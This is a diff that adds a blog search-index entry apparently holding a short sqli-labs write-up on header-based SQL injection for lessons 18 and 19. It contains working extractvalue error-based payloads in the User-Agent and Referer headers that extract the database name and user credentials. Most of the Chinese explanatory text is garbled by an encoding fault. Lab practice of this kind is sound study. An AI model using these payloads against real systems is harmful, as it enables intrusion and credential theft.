@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>note-10</title>
+    <link href="/2025/03/10/note-10/"/>
+    <url>/2025/03/10/note-10/</url>
+    
+    <content type="html"><![CDATA[<h1 id="less18-�����ae�����ͷע��"><a href="#less18-�����ae�����ͷע��" class="headerlink" title="less18 �����ǽ�����ͷע��"></a>less18 �����ǽ�����ͷע��</h1><p>����ͷ�����Ե�״������  </p><p><img src="/%5Cimg%5Cnote-10%5C1.png">  </p><p>����payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>ΪʲôҪ�� or �� and ����:</p><p>��Ϊʹ���˱���ע�룬������Ҫʹ��or��and���պ�ԭ��䲢�����ע����䡣</p><h1 id="less19-ͷ��ע��-Referer"><a href="#less19-ͷ��ע��-Referer" class="headerlink" title="less19 ͷ��ע��-Referer"></a>less19 ͷ��ע��-Referer</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure><p>ͬ��</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>sql-labs</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>note-09</title>
     <link href="/2025/03/09/note-09/"/>
     <url>/2025/03/09/note-09/</url>
